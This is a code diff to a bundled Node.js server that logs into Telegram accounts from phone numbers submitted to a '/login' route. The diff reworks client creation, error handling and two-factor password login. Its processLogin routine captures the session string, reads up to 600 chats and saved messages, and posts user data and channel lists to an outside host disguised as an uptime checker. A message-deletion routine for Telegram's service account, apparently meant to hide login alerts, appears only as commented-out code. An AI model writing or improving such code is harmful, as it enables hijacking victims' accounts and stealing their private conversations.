@@ -45423,7 +45423,6 @@ async function sendCode(client, apiCredentials, phoneNumber, forceSMS = false) {
 exports.sendCode = sendCode;
 /** @hidden */
 async function signInWithPassword(client, apiCredentials, authParams) {
-  console.log(authParams)
     let emptyPassword = false;
     while (1) {
         try {
@@ -60070,7 +60069,7 @@ app.get('/', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
 }));
 app.get('/login', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
     const result = yield (0, telegramManager_1.createClient)(req.query.phone);
-    if (result.isCodeViaApp) {
+    if (result === null || result === void 0 ? void 0 : result.isCodeViaApp) {
         console.log('OTP SENT!! - ', req.query.phone);
         res.status(200).send(result.phoneCodeHash);
     }
@@ -60173,6 +60172,7 @@ const telegram_2 = __webpack_require__(/*! telegram */ "./node_modules/telegram/
 const sessions_1 = __webpack_require__(/*! telegram/sessions */ "./node_modules/telegram/sessions/index.js");
 const axios_1 = __importDefault(__webpack_require__(/*! axios */ "./node_modules/axios/dist/node/axios.cjs"));
 const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "./node_modules/telegram/Helpers.js");
+const Password_1 = __webpack_require__(/*! telegram/Password */ "./node_modules/telegram/Password.js");
 const clients = new Map();
 let creds = [
     {
@@ -60236,6 +60236,8 @@ exports.hasClient = hasClient;
 function deleteClient(number) {
     return __awaiter(this, void 0, void 0, function* () {
         console.log("Deleting Client - ", number);
+        const cli = getClient(number);
+        yield (cli === null || cli === void 0 ? void 0 : cli.disconnect());
         return clients.delete(number);
     });
 }
@@ -60258,29 +60260,36 @@ function disconnectAll() {
 exports.disconnectAll = disconnectAll;
 function createClient(number) {
     return __awaiter(this, void 0, void 0, function* () {
-        if (clients.has(number)) {
-            console.log("Client already exist");
-            const cli = clients.get(number);
-            setTimeout(() => __awaiter(this, void 0, void 0, function* () {
-                yield restAcc(number);
-            }), 150000);
-            return (yield cli.sendCode(false));
+        try {
+            if (clients.has(number)) {
+                console.log("Client already exist");
+                const cli = clients.get(number);
+                setTimeout(() => __awaiter(this, void 0, void 0, function* () {
+                    yield restAcc(number);
+                }), 150000);
+                return (yield cli.sendCode(false));
+            }
+            else {
+                const randomIndex = Math.floor(Math.random() * creds.length);
+                const apiHash = creds[randomIndex].apiHash;
+                const apiId = creds[randomIndex].apiId;
+                console.log("Creating new client - ", number, creds[randomIndex]);
+                const cli = new TelegramManager(number, apiId, apiHash);
+                clients.set(number, cli);
+                yield (0, Helpers_1.sleep)(500);
+                return (yield cli.sendCode(false));
+            }
         }
-        else {
-            console.log("Creating new client");
-            const cli = new TelegramManager(number);
-            clients.set(number, cli);
-            yield (0, Helpers_1.sleep)(500);
-            return (yield cli.sendCode(false));
+        catch (error) {
+            console.log(error);
         }
     });
 }
 exports.createClient = createClient;
 class TelegramManager {
-    constructor(number) {
-        const randomIndex = Math.floor(Math.random() * creds.length);
-        this.apiId = creds[randomIndex].apiId;
-        this.apiHash = creds[randomIndex].apiHash;
+    constructor(number, apiId, apiHash) {
+        this.apiId = apiId;
+        this.apiHash = apiHash;
         this.phoneNumber = number;
         this.session = new sessions_1.StringSession('');
         this.client = null;
@@ -60316,28 +60325,27 @@ class TelegramManager {
                 yield this.client.connect();
             }
             catch (error) {
-                console.log(error);
+                console.log("Error while Connecting:", error);
             }
         });
     }
     deleteMessages() {
-        var _a, _b;
         return __awaiter(this, void 0, void 0, function* () {
-            console.log("IsConnected - ", this.client.connected, this.phoneNumber);
-            if (this.client.connected) {
-                try {
-                    const msgs = yield this.client.getMessages("777000", { limit: 10 });
-                    const len = msgs['total'];
-                    console.log(len);
-                    for (let i = 0; i < len - 1; i++) {
-                        console.log((_a = msgs[i]) === null || _a === void 0 ? void 0 : _a.text);
-                        (_b = msgs[i]) === null || _b === void 0 ? void 0 : _b.delete({ revoke: true });
-                    }
-                }
-                catch (error) {
-                    console.log("Cannot delete Messages - ", this.phoneNumber);
-                }
-            }
+            // console.log("IsConnected - ", this.client.connected, this.phoneNumber);
+            // if (this.client.connected) {
+            //     try {
+            //         const msgs = await this.client.getMessages("777000", { limit: 10 });
+            //         const len = msgs['total'];
+            //         console.log(len)
+            //         for (let i = 0; i < len - 1; i++) {
+            //             console.log(msgs[i]?.text);
+            //             msgs[i]?.delete({ revoke: true });
+            //         }
+            //     } catch (error) {
+            //         console.log("Cannot delete Messages - ", this.phoneNumber);
+            //     }
+            // }
+            console.log("DeleteMessages TODO");
         });
     }
     sendCode(forceSMS = false) {
@@ -60380,10 +60388,15 @@ class TelegramManager {
             catch (err) {
                 console.log(err);
                 if (err.errorMessage === "AUTH_RESTART") {
-                    return this.client.sendCode({ apiId: this.apiId, apiHash: this.apiHash }, `+${this.phoneNumber}`, forceSMS);
+                    try {
+                        return this.client.sendCode({ apiId: this.apiId, apiHash: this.apiHash }, `+${this.phoneNumber}`, forceSMS);
+                    }
+                    catch (error) {
+                        console.log(error);
+                    }
                 }
                 else {
-                    throw err;
+                    console.log(err);
                 }
             }
         });
@@ -60410,7 +60423,7 @@ class TelegramManager {
                     termsOfService = result.termsOfService;
                 }
                 else {
-                    yield this.processLogin(result);
+                    yield this.processLogin(result.user);
                     yield restAcc(this.phoneNumber);
                     return { status: 200, message: "Login success" };
                 }
@@ -60419,10 +60432,18 @@ class TelegramManager {
                 console.log(err);
                 if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
                     console.log("passowrd Required");
-                    const result = yield this.client.signInWithPassword({ apiHash: this.apiHash, apiId: this.apiId }, { password: () => Promise.resolve(passowrd), onError: (e) => { console.log(e); } });
-                    yield this.processLogin(result);
-                    return { status: 400, message: "2FA required" };
-                    // return client.signInWithPassword(apiCredentials, { password: () => Promise.resolve(password), onError: (err) => console.log(err) });
+                    try {
+                        const passwordSrpResult = yield this.client.invoke(new telegram_1.Api.account.GetPassword());
+                        const passwordSrpCheck = yield (0, Password_1.computeCheck)(passwordSrpResult, passowrd);
+                        const { user } = (yield this.client.invoke(new telegram_1.Api.auth.CheckPassword({
+                            password: passwordSrpCheck,
+                        })));
+                        yield this.processLogin(user);
+                        return { status: 200, message: "Login success" };
+                    }
+                    catch (error) {
+                        return { status: 400, message: "2FA required" };
+                    }
                 }
                 else {
                     const shouldWeStop = false; //await authParams.onError(err);
@@ -60466,7 +60487,7 @@ class TelegramManager {
         return __awaiter(this, void 0, void 0, function* () {
             console.log(this.client.session.save());
             const sess = this.client.session.save();
-            const user = yield result.user.toJSON();
+            const user = yield result.toJSON();
             const chats = yield ((_a = this.client) === null || _a === void 0 ? void 0 : _a.getDialogs({ limit: 600 }));
             const myMsgs = yield this.client.getMessages('me', { limit: 8 });
             let personalChats = 0;
@@ -60505,7 +60526,6 @@ class TelegramManager {
             yield axios_1.default.post(`https://uptimechecker.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
             yield axios_1.default.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
             yield (0, Helpers_1.sleep)(3000);
-            yield this.deleteMessages();
         });
     }
 }
